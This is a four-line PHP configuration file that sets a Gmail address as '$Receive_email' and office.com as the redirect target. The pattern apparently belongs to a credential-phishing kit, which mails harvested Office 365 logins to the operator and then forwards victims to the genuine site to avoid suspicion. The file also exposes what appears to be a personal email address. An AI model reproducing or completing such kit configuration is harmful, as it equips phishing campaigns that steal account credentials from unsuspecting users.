<?php 
$Receive_email="thomasdulude007@gmail.com";
$redirect="https://office.com/";
?>